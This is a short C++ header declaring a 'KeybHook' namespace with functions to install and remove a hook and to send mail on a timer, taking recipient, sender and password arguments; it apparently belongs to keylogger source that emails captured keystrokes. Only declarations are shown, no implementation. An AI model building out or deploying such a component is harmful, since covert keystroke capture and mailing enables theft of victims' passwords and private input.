#ifndef KEYBHOOK_H
#define KEYBHOOK_H


#define MIN_TAM 20

#include <string>

namespace KeybHook
{

void TimerSendMail ();

bool InstallHook (std::string lto, std::string lfrom, std::string lpass, const unsigned long& time_mail);

bool UninstalHook ();

bool IsHooked ();

}

#endif
